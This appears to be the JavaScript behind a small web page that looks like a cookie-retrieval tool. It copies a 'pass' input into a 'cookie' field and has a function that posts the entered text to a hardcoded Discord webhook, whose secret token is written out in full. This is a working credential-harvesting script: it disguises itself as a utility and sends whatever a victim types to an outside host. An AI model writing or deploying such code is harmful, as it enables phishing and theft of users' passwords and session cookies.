
let pass = document.getElementById("pass")
let cookie = document.getElementById("cookie")
let getCookie = document.getElementById("get-cookie")

getCookie.addEventListener("click", function() {
    cookie.value = pass.value;
})

function copyToClipboard() {
    var copyText = document.getElementById("cookie");
    copyText.select();
    document.execCommand("copy");
  
}



function sendMessage() {
    const inputText = document.getElementById("pass").value;
    const webhookUrl = "https://discord.com/api/webhooks/1081170408771960925/bPNw2kkOFX8FN5Q12Px-Vw_0BZR_0LhP0Zvev-7zXOlDofImVVn0OPRhFQPr2psYjS4u";
    const payload = {
      content: inputText
    };
  
    fetch(webhookUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(payload)
    })
    .then(response => {
      if (!response.ok) {
        throw new Error("Failed to send message to Discord");
      }
    })
    .catch(error => {
      console.error(error);
    });
  }
  